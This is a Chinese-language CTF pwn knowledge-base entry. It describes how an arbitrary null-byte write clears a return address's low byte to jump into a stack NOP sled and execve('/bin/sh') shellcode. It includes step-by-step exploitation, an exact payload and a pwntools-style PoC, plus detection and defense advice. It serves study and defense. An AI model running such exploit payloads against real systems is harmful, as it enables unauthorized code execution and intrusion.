---
id: binary-pwn-stack-arbitrary-null-byte-return-redirect-shellcode
title: 任意空字节写入改返回地址低位：栈上 NOP 滑板 + shellcode 劫持
type: scenario
domain: binary
path: binary/pwn/stack
technique: arbitrary-null-byte-return-redirect-shellcode
aliases:
- 任意空字节写
- buf[v2]=0
- find the way
- 返回地址低位清零
- 栈上 shellcode 执行
tags:
- pwn
- stack
- null-byte
- return-address
- shellcode
- x86-64
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V214
  verified_at: '2026-11-07T04:21:09+08:00'
  notes: 已对照原文 find the way 的 IDA 伪代码与 exp 核对：buf[160]、read 0xA0、v1=strlen(buf)、v2+=v1、buf[v2]=0、payload(0x00+0x90*0x78+add rsp,0x1000+shellcode) 与 v2=0xA8 均一致。未复跑二进制。
---

## 一句话结论

当程序先 `read` 一段可控数据到栈缓冲区，再计算 `v2 = input_v2 + strlen(buf)` 并执行 `buf[v2] = 0` 时，攻击者可以用一个空字节开头让 `strlen` 返回 0，把 `v2` 直接设为任意偏移，从而在栈上任意位置写一个 0；把返回地址的低字节清零到指向缓冲区内的 NOP 滑板/shellcode，即可在函数返回时执行任意代码。

## 原理

- 文章程序 `find_the_way`：`char buf[160]`；`memcpy(&dest_, &buf[v1], 8)`（v1 可控）；`read(0, buf, 0xA0)`（最多 160 字节，正好填满 buf）；`v1 = strlen(buf)`；`scanf("%d", &v2)`；`v2 += v1`；`buf[v2] = 0`。
- 写入位置是 `buf + strlen(buf) + input_v2`。如果 payload 以 `\x00` 开头，`strlen(buf)` 返回 0，写入位置就是 `buf + input_v2`，攻击者可用 `input_v2` 在栈上任意（相对 buf）写一个空字节。
- 目标是返回地址：把返回地址的最低字节清零，使其从原值 `0x...XX` 变成 `0x...00`，落回同一页内；如果在该地址附近布置 NOP 滑板 + shellcode，返回时就会滑入 shellcode。
- 文章 payload：`b'\x00' + b'\x90'*0x78 + b'\x48\x81\xc4\x00\x10\x00\x00' + shellcode`；`\x48\x81\xc4\x00\x10\x00\x00` 是 `add rsp, 0x1000`，用于把栈抬到 shellcode 所在区域（因为返回地址被改到低地址后 RSP 可能落在 payload 前部）。
- 发送 `v2=0xA8`（168）把返回地址最低字节写成 0，从而跳到 payload 的 NOP 滑板/shellcode 区域。

## 触发条件

- 程序存在“先读入可控缓冲区、再用 `strlen(buf)+用户输入` 作为索引写 0”的逻辑（off-by-one/任意空字节写）。
- 缓冲区在栈上，返回地址与缓冲区距离/页对齐关系可利用；返回地址低字节清零后能落到 payload 区域内。
- 栈可执行（NX 关闭）或可通过 ROP 绕过 NX；文章题目为可执行栈 + shellcode。
- 攻击者能提供包含 NOP 滑板、栈调整指令和 shellcode 的 payload。

## 利用步骤

1. 逆向确认 `buf` 大小、返回地址相对 `buf` 的偏移，以及 `v2 = strlen(buf) + input_v2` 的计算方式。
2. 构造 payload：`\x00` 开头（让 strlen=0）+ NOP 滑板 + 栈调整 gadget/指令 + shellcode，总长不超过 `read` 上限。
3. 第一次输入 v1（文章用 0x80，仅用于 memcpy 干扰/读取），再发送 payload。
4. 计算 `input_v2`，使 `buf[input_v2] = 0` 正好覆盖返回地址的最低字节；文章为 0xA8。
5. 函数返回时跳到被清零后的地址，滑板执行 shellcode（文章为 `execve("/bin/sh")`）。

## PoC

文章 exp 的关键部分：

```python
ru(b'Where is the your home:')
sl(str(0x80))
ru(b'Where can you find mother:')
s(b'\x00' + b'\x90' * 0x78 + b'\x48\x81\xc4\x00\x10\x00\x00' + ShellcodeMall.amd64.execve_bin_sh)
ru(b'How many moms did you find:')
sl(str(0xA8))
ia()
```

说明：`0xA8` 是相对 `buf` 的偏移，用于把返回地址最低字节写成 0；实际偏移需按二进制栈布局调整。

## 变体与关联

- 变体：返回地址低 2 字节清零/部分覆盖，跳到同一页内的其他 gadget/函数。
- 变体：把返回地址改成栈上 ROP 链地址（NX 开启时），用 `add rsp`/`leave; ret` 调整栈。
- 变体：利用 `strlen` 遇到空字节截断的特性控制索引，属于“写 NULL 字节”原语；也可用于改 GOT/函数指针低位。
- 关联：[[binary-pwn-stack-canary-lowbyte-nul-overwrite-string-leak]]（另一种空字节相关栈技巧：改 canary 低字节泄露）。
- 关联：[[binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage]]（NX 开启时的 ROP 替代）。
- 边界：栈不可执行且无可用的栈调整/ROP gadget、返回地址低字节清零后不落在可控区域、payload 长度受限时，该手法失败。

## 检测与防御

- 检测：代码中出现 `buf[strlen(buf) + user_index] = 0`、`buf[user_index] = 0` 等可写任意空字节的模式；`read` 长度等于/超过缓冲区大小；栈上存在可执行 payload。
- 防御：对索引做范围校验（必须 `< sizeof(buf)`）；使用 `strnlen` 并限制 `read` 长度；开启 NX/ASLR/Canary/PIE；编译时启用 `-fstack-protector`。
- 加固：把缓冲区与返回地址之间加入 guard page/随机偏移；对用户可控索引做白名单；使用安全语言/边界检查库。
